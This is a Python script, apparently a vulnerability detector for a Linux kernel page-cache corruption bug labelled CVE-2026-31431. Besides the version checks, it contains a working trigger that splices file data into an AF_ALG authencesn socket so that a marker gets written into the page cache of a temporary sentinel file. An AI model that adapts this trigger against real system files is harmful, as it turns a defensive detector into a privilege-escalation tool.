#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2026-31431 ("Copy Fail") vulnerability detector
Python 3.6 compatible — merged version (expert fixes + robust kernel detection)

Exit codes:
  0 = NOT vulnerable (kernel too old or module unavailable)
  2 = VULNERABLE (affected kernel + module accessible + corruption detected)
  1 = ERROR (test failed, insufficient permissions, unsupported syscall, etc.)
"""

from __future__ import print_function
import errno
import os
import socket
import struct
import sys
import tempfile
import ctypes
import ctypes.util

# --- Typing compatibility for Python 3.6 ---
try:
    from typing import Optional, Tuple
except ImportError:
    Optional = lambda x: x
    Tuple = lambda *a: tuple

# --- Constants ---
AF_ALG = 38
SOL_ALG = 279
ALG_SET_KEY = 1
ALG_SET_IV = 2
ALG_SET_OP = 3
ALG_SET_AEAD_ASSOCLEN = 4
ALG_OP_DECRYPT = 0
CRYPTO_AUTHENC_KEYA_PARAM = 1

ALG_NAME = "authencesn(hmac(sha256),cbc(aes))"
PAGE = 4096
ASSOCLEN = 8
CRYPTLEN = 16
TAGLEN = 16
MARKER = b"PWND"

# --- Syscall numbers by architecture ---
SPLICE_SYSCALLS = {
    'x86_64': 275,
    'aarch64': 275,
    'ppc64': 364,
    'ppc64le': 364,
    's390x': 276,
}

# --- Load libc and configure syscall signature (module-level, efficient) ---
_libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
_libc.syscall.restype = ctypes.c_long
_libc.syscall.argtypes = [ctypes.c_long] * 7

# splice flags
SPLICE_F_MOVE = 0x01
SPLICE_F_NONBLOCK = 0x02
SPLICE_F_MORE = 0x04
SPLICE_F_GIFT = 0x08


def _get_splice_syscall_number():
    # type: () -> int
    """Returns splice() syscall number for current architecture"""
    arch = os.uname().machine
    return SPLICE_SYSCALLS.get(arch, 275)  # default to x86_64


def _splice(fd_in, off_in, fd_out, off_out, length, flags):
    # type: (int, Optional[int], int, Optional[int], int, int) -> int
    """
    Direct syscall wrapper for splice() compatible with Python 3.6.
    CORRECTLY passes loff_t* arguments as pointers (not values).
    """
    syscall_num = _get_splice_syscall_number()
    
    # loff_t* arguments: NULL pointer (0) if None, otherwise pointer to value
    if off_in is None:
        off_in_ptr = ctypes.c_void_p(0)
    else:
        off_in_val = ctypes.c_longlong(off_in)
        off_in_ptr = ctypes.pointer(off_in_val)
    
    if off_out is None:
        off_out_ptr = ctypes.c_void_p(0)
    else:
        off_out_val = ctypes.c_longlong(off_out)
        off_out_ptr = ctypes.pointer(off_out_val)
    
    res = _libc.syscall(
        ctypes.c_long(syscall_num),   # syscall number
        ctypes.c_long(fd_in),          # fd_in
        off_in_ptr,                    # off_in (loff_t*) ← POINTER, not value!
        ctypes.c_long(fd_out),         # fd_out
        off_out_ptr,                   # off_out (loff_t*) ← POINTER, not value!
        ctypes.c_long(length),         # len
        ctypes.c_long(flags)           # flags
    )
    
    if res < 0:
        err = ctypes.get_errno()
        raise OSError(err, os.strerror(err))
    return int(res)


def parse_kernel_version(release_str):
    # type: (str) -> Tuple[int, int, int, str]
    """
    Parse kernel release string into (major, minor, patch, flavor).
    Handles RHEL backports like '4.18.0-553.111.1.el8_10.x86_64'
    """
    base = release_str.split('-')[0]
    parts = base.split('.')
    try:
        major = int(parts[0]) if len(parts) > 0 else 0
        minor = int(parts[1]) if len(parts) > 1 else 0
        patch = int(parts[2]) if len(parts) > 2 else 0
    except ValueError:
        major, minor, patch = 0, 0, 0
    flavor = release_str.split('-', 1)[1] if '-' in release_str else ''
    return major, minor, patch, flavor


def is_kernel_affected(release_str):
    # type: (str) -> Tuple[bool, str]
    """
    Check if kernel version falls into CVE-2026-31431 affected range.
    
    Affected: mainline kernels 6.12.x through 6.18.x (inclusive)
    RHEL/AlmaLinux backports (4.18, 5.14) are NOT affected by this specific bug.
    
    Returns: (is_affected, explanation)
    """
    major, minor, patch, flavor = parse_kernel_version(release_str)
    
    # RHEL 8 base kernel (4.18) - not in affected range
    if major == 4 and minor == 18:
        return False, "RHEL 8 base kernel (4.18) - not in 6.12-6.18 affected range"
    
    # RHEL 9 base kernel (5.14) - not in affected range  
    if major == 5 and minor == 14:
        return False, "RHEL 9 base kernel (5.14) - not in 6.12-6.18 affected range"
    
    # Check mainline affected range: 6.12.0 <= version < 6.19.0
    if major == 6:
        if 12 <= minor <= 18:
            return True, "Kernel {} is in affected range 6.12-6.18".format(release_str)
        elif minor < 12:
            return False, "Kernel {} predates affected 6.12+ series".format(release_str)
        else:
            return False, "Kernel {} postdates affected 6.12-6.18 range".format(release_str)
    
    if major < 6:
        return False, "Kernel {} predates affected 6.x series".format(release_str)
    else:
        return False, "Kernel {} postdates affected 6.12-6.18 range".format(release_str)


def build_authenc_keyblob(authkey, enckey):
    # type: (bytes, bytes) -> bytes
    """Build keyblob for authenc algorithm as expected by kernel"""
    rtattr = struct.pack("HH", 8, CRYPTO_AUTHENC_KEYA_PARAM)
    keyparam = struct.pack(">I", len(enckey))
    return rtattr + keyparam + authkey + enckey


def precheck():
    # type: () -> Optional[str]
    """Verify prerequisites for the vulnerability test"""
    if not os.path.exists("/proc/crypto"):
        return "/proc/crypto not found"
    
    try:
        s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
        s.close()
    except OSError as e:
        return "AF_ALG socket family unavailable: {}".format(
            getattr(e, 'strerror', str(e)))
    
    try:
        s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
        s.bind(("aead", ALG_NAME))
        s.close()
    except OSError:
        # Algorithm not available - good for security, not an error
        return None
    
    return None


def attempt_trigger(target_path):
    # type: (str) -> Tuple[bytes, bytes]
    """
    Attempt to trigger the vulnerability condition on a test file.
    Returns: (after_content, original_sentinel)
    """
    # FIXED: proper newline inside byte string
    sentinel = (b"COPYFAIL-SENTINEL-UNCORRUPTED!\n" * (PAGE // 32))[:PAGE]
    
    with open(target_path, "wb") as f:
        f.write(sentinel)
    
    # Preload into page cache
    fd_target = os.open(target_path, os.O_RDONLY)
    os.read(fd_target, PAGE)
    os.lseek(fd_target, 0, os.SEEK_SET)
    
    # Setup AF_ALG socket
    master = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    master.bind(("aead", ALG_NAME))
    keyblob = build_authenc_keyblob(b"\x00" * 32, b"\x00" * 16)
    master.setsockopt(SOL_ALG, ALG_SET_KEY, keyblob)
    op, _ = master.accept()
    
    # AAD: 4 bytes SPI + 4 bytes seqno_lo (our marker)
    aad = b"\x00" * 4 + MARKER
    
    # Control messages
    cmsg = [
        (SOL_ALG, ALG_SET_OP, struct.pack("I", ALG_OP_DECRYPT)),
        (SOL_ALG, ALG_SET_IV, struct.pack("I", 16) + b"\x00" * 16),
        (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, struct.pack("I", ASSOCLEN)),
    ]
    
    op.sendmsg([aad], cmsg, socket.MSG_MORE)
    
    # Pipe for splice
    pr, pw = os.pipe()
    
    try:
        # File -> pipe
        n = _splice(fd_target, 0, pw, None, CRYPTLEN + TAGLEN, SPLICE_F_MOVE)
        if n != CRYPTLEN + TAGLEN:
            raise RuntimeError("splice file->pipe short: {}".format(n))
        
        # Pipe -> AF_ALG socket
        n = _splice(pr, None, op.fileno(), None, n, SPLICE_F_MOVE)
        if n != CRYPTLEN + TAGLEN:
            raise RuntimeError("splice pipe->socket short: {}".format(n))
            
    except OSError as e:
        os.close(pr); os.close(pw); op.close(); master.close(); os.close(fd_target)
        if e.errno in (errno.EOPNOTSUPP, errno.ENOTSUP, errno.EINVAL):
            raise RuntimeError(
                "splice into AF_ALG socket not supported - "
                "this kernel may not be vulnerable via this vector")
        raise
    
    # Trigger decryption (EBADMSG is expected)
    try:
        op.recv(ASSOCLEN + CRYPTLEN + TAGLEN)
    except OSError as e:
        if e.errno not in (errno.EBADMSG, errno.EINVAL):
            raise
    
    # Cleanup
    op.close(); master.close(); os.close(pr); os.close(pw)
    
    # Read back from page cache
    os.lseek(fd_target, 0, os.SEEK_SET)
    after = os.read(fd_target, PAGE)
    os.close(fd_target)
    
    return after, sentinel


def check_module_in_proc():
    # type: () -> bool
    """Check if algif_aead appears in /proc/crypto"""
    try:
        with open("/proc/crypto", "r") as f:
            return "algif_aead" in f.read().lower()
    except (IOError, OSError):
        return False


def main():
    # type: () -> int
    kernel_release = os.uname().release
    arch = os.uname().machine
    
    print("[*] CVE-2026-31431 detector")
    print("[*] Kernel: {} ({})".format(kernel_release, arch))
    print("[*] Python: {}.{}.{}".format(
        sys.version_info.major, sys.version_info.minor, sys.version_info.micro))
    
    affected, explanation = is_kernel_affected(kernel_release)
    print("[i] Version check: {}".format(explanation))
    
    if not affected:
        print("[i] Based on kernel version alone, this system is NOT in the")
        print("[i] directly affected range for CVE-2026-31431.")
    
    reason = precheck()
    if reason:
        print("[+] Precondition not met: {}. NOT vulnerable.".format(reason))
        return 0
    
    print("[+] AF_ALG + {!r} appears loadable".format(ALG_NAME))
    
    if check_module_in_proc():
        print("[+] Module algif_aead found in /proc/crypto")
    
    if not affected:
        print("[i] Skipping exploit trigger (kernel version not affected)")
        print("[i] For defense-in-depth, consider blocking algif_aead if unused:")
        print("[i]   echo 'install algif_aead /bin/false' | sudo tee /etc/modprobe.d/disable-algif.conf")
        return 0
    
    # Attempt trigger
    tmp = tempfile.mkdtemp(prefix="copyfail-")
    target = os.path.join(tmp, "sentinel.bin")
    
    try:
        after, sentinel = attempt_trigger(target)
    except Exception as e:
        print("[!] Trigger failed: {}: {}".format(type(e).__name__, e))
        return 1
    finally:
        try:
            os.remove(target)
            os.rmdir(tmp)
        except OSError:
            pass
    
    # Analysis: EXPERT FIX — safe length comparison
    marker_off = after.find(MARKER)
    marker_orig = sentinel.find(MARKER)
    min_len = min(len(after), len(sentinel))  # ← prevents IndexError
    diffs = [i for i in range(min_len) if after[i] != sentinel[i]]
    
    if marker_off >= 0 and marker_orig < 0:
        ctx = after[max(marker_off - 4, 0):marker_off + 12]
        print("[!] VULNERABLE to CVE-2026-31431")
        print("[!] Marker {!r} found in page-cache page at offset {}".format(MARKER, marker_off))
        print("[!] Surrounding bytes: {} ({!r})".format(ctx.hex(), ctx))
        print("[!] ACTION: Update kernel or block algif_aead immediately")
        return 2
    
    if diffs:
        first = diffs[0]
        window = after[first:first + 16]
        print("[!] Page cache MODIFIED via AEAD splice path")
        print("[!] {} bytes changed, first at offset {}".format(len(diffs), first))
        print("[!] Window: {}".format(window.hex()))
        print("[!] Treat as VULNERABLE until patched kernel is installed")
        return 2
    
    print("[+] Page cache intact. NOT vulnerable on this kernel.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
